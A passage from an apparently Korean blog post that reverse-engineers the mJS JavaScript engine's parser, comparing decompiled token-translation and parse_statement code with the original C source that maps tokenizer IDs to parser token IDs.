</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x2D</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">14</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x2E</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">20</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x2F</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">15</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x3A</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x3B</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">3</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x3C</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">24</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x3D</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">5</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x3E</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">25</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x3F</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">21</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x5B</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">10</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x5D</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">11</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x5E</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">19</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x7B</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">6</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x7C</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">18</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x7D</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">7</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x7E</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">23</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x213D</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">39</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x253D</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">36</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x2626</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">42</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x263D</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">34</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x2A3D</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">32</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x2B2B</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">29</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x2B3D</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">30</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x2D2D</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">28</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x2D3D</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">31</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x2F3D</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">33</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x3C3C</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">26</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x3C3D</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">40</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x3D3D</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">38</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x3E3D</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">41</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x3E3E</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">27</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x5E3D</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">37</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x7C3D</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">35</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x7C7C</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">43</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x213D3D</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">45</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x3C3C3D</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">46</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x3D3D3D</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">44</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x3E3E3D</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">47</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x3E3E3E</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">48</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x3E3E3E3D</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">49</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> tok;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>이건 그냥 tok에 맞는게 있으면, 그걸 리턴해준다.
이부분은 소스코드를 보는게 더 이해가 잘된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">ptranslate</span>(<span style="color:#66d9ef">int</span> tok) {
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define DT(a, b) ((a) &lt;&lt; 8 | (b))
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define TT(a, b, c) ((a) &lt;&lt; 16 | (b) &lt;&lt; 8 | (c))
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define QT(a, b, c, d) ((a) &lt;&lt; 24 | (b) &lt;&lt; 16 | (c) &lt;&lt; 8 | (d))
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">/* Map token ID produced by mjs_tok.c to token ID produced by lemon */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* clang-format off */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span> (tok) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;:&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_COLON;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;;&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_SEMICOLON;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_COMMA;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;=&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_ASSIGN;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;{&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_OPEN_CURLY;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;}&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_CLOSE_CURLY;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;(&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_OPEN_PAREN;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;)&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_CLOSE_PAREN;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;[&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_OPEN_BRACKET;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;]&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_CLOSE_BRACKET;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;*&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_MUL;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;+&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_PLUS;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;-&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_MINUS;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;/&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_DIV;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;%&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_REM;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;&amp;&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_AND;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;|&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_OR;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;^&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_XOR;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_DOT;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;?&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_QUESTION;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;!&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_NOT;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;~&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_TILDA;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;&lt;&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_LT;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;&gt;&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_GT;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">DT</span>(<span style="color:#e6db74">&#39;&lt;&#39;</span>,<span style="color:#e6db74">&#39;&lt;&#39;</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_LSHIFT;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">DT</span>(<span style="color:#e6db74">&#39;&gt;&#39;</span>,<span style="color:#e6db74">&#39;&gt;&#39;</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_RSHIFT;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">DT</span>(<span style="color:#e6db74">&#39;-&#39;</span>,<span style="color:#e6db74">&#39;-&#39;</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_MINUS_MINUS;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">DT</span>(<span style="color:#e6db74">&#39;+&#39;</span>,<span style="color:#e6db74">&#39;+&#39;</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_PLUS_PLUS;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">DT</span>(<span style="color:#e6db74">&#39;+&#39;</span>,<span style="color:#e6db74">&#39;=&#39;</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_PLUS_ASSIGN;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">DT</span>(<span style="color:#e6db74">&#39;-&#39;</span>,<span style="color:#e6db74">&#39;=&#39;</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_MINUS_ASSIGN;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">DT</span>(<span style="color:#e6db74">&#39;*&#39;</span>,<span style="color:#e6db74">&#39;=&#39;</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_MUL_ASSIGN;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">DT</span>(<span style="color:#e6db74">&#39;/&#39;</span>,<span style="color:#e6db74">&#39;=&#39;</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_DIV_ASSIGN;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">DT</span>(<span style="color:#e6db74">&#39;&amp;&#39;</span>,<span style="color:#e6db74">&#39;=&#39;</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_AND_ASSIGN;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">DT</span>(<span style="color:#e6db74">&#39;|&#39;</span>,<span style="color:#e6db74">&#39;=&#39;</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_OR_ASSIGN;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">DT</span>(<span style="color:#e6db74">&#39;%&#39;</span>,<span style="color:#e6db74">&#39;=&#39;</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_REM_ASSIGN;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">DT</span>(<span style="color:#e6db74">&#39;^&#39;</span>,<span style="color:#e6db74">&#39;=&#39;</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_XOR_ASSIGN;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">DT</span>(<span style="color:#e6db74">&#39;=&#39;</span>,<span style="color:#e6db74">&#39;=&#39;</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_EQ;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">DT</span>(<span style="color:#e6db74">&#39;!&#39;</span>,<span style="color:#e6db74">&#39;=&#39;</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_NE;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">DT</span>(<span style="color:#e6db74">&#39;&lt;&#39;</span>,<span style="color:#e6db74">&#39;=&#39;</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_LE;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">DT</span>(<span style="color:#e6db74">&#39;&gt;&#39;</span>,<span style="color:#e6db74">&#39;=&#39;</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_GE;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">DT</span>(<span style="color:#e6db74">&#39;&amp;&#39;</span>,<span style="color:#e6db74">&#39;&amp;&#39;</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_LOGICAL_AND;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">DT</span>(<span style="color:#e6db74">&#39;|&#39;</span>,<span style="color:#e6db74">&#39;|&#39;</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_LOGICAL_OR;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">TT</span>(<span style="color:#e6db74">&#39;=&#39;</span>,<span style="color:#e6db74">&#39;=&#39;</span>,<span style="color:#e6db74">&#39;=&#39;</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_EQ_EQ;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">TT</span>(<span style="color:#e6db74">&#39;!&#39;</span>,<span style="color:#e6db74">&#39;=&#39;</span>,<span style="color:#e6db74">&#39;=&#39;</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_NE_NE;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">TT</span>(<span style="color:#e6db74">&#39;&lt;&#39;</span>,<span style="color:#e6db74">&#39;&lt;&#39;</span>,<span style="color:#e6db74">&#39;=&#39;</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_LSHIFT_ASSIGN;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">TT</span>(<span style="color:#e6db74">&#39;&gt;&#39;</span>,<span style="color:#e6db74">&#39;&gt;&#39;</span>,<span style="color:#e6db74">&#39;=&#39;</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_RSHIFT_ASSIGN;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">TT</span>(<span style="color:#e6db74">&#39;&gt;&#39;</span>,<span style="color:#e6db74">&#39;&gt;&#39;</span>,<span style="color:#e6db74">&#39;&gt;&#39;</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_URSHIFT;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">QT</span>(<span style="color:#e6db74">&#39;&gt;&#39;</span>,<span style="color:#e6db74">&#39;&gt;&#39;</span>,<span style="color:#e6db74">&#39;&gt;&#39;</span>,<span style="color:#e6db74">&#39;=&#39;</span>)<span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> TOK_URSHIFT_ASSIGN;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* clang-format on */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> tok;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">mjs_err_t</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">parse_statement</span>(pstate <span style="color:#f92672">*</span>p)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> tok; <span style="color:#75715e">// [rsp+8h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_err_t</span> res; <span style="color:#75715e">// [rsp+Ch] [rbp-14h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">cs_log_print_prefix</span>(LL_VERBOSE_DEBUG, <span style="color:#e6db74">&#34;src/mjs_parser.c&#34;</span>, <span style="color:#ae81ff">900</span>) )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cs_log_printf</span>(<span style="color:#e6db74">&#34;[%.*s]&#34;</span>, <span style="color:#ae81ff">10</span>, p<span style="color:#f92672">-&gt;</span>tok.ptr);
</span></span><span style="display:flex;"><span>  tok <span style="color:#f92672">=</span> p<span style="color:#f92672">-&gt;</span>tok.tok;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span> ( tok )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">emit_byte</span>(p, <span style="color:#ae81ff">0x11u</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">cs_log_print_prefix</span>(LL_VERBOSE_DEBUG, <span style="color:#e6db74">&#34;src/mjs_parser.c&#34;</span>, <span style="color:#ae81ff">904</span>) )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">cs_log_printf</span>(<span style="color:#e6db74">&#34;  PNEXT %d&#34;</span>, <span style="color:#ae81ff">904LL</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">goto</span> LABEL_34;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">6</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">parse_block</span>(p, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xCB</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">emit_byte</span>(p, <span style="color:#ae81ff">0x11u</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">emit_byte</span>(p, <span style="color:#ae81ff">0x20u</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">cs_log_print_prefix</span>(LL_VERBOSE_DEBUG, <span style="color:#e6db74">&#34;src/mjs_parser.c&#34;</span>, <span style="color:#ae81ff">919</span>) )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">cs_log_printf</span>(<span style="color:#e6db74">&#34;  PNEXT %d&#34;</span>, <span style="color:#ae81ff">919LL</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">goto</span> LABEL_34;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)(tok <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xCC</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> LABEL_36;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( tok <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xCE</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">emit_byte</span>(p, <span style="color:#ae81ff">0x21u</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">cs_log_print_prefix</span>(LL_VERBOSE_DEBUG, <span style="color:#e6db74">&#34;src/mjs_parser.c&#34;</span>, <span style="color:#ae81ff">923</span>) )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">cs_log_printf</span>(<span style="color:#e6db74">&#34;  PNEXT %d&#34;</span>, <span style="color:#ae81ff">923LL</span>);
</span></span><span style="display:flex;"><span>LABEL_34:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pnext</span>(p);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)(tok <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xD1</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> LABEL_36;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( tok <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xD6</span> )
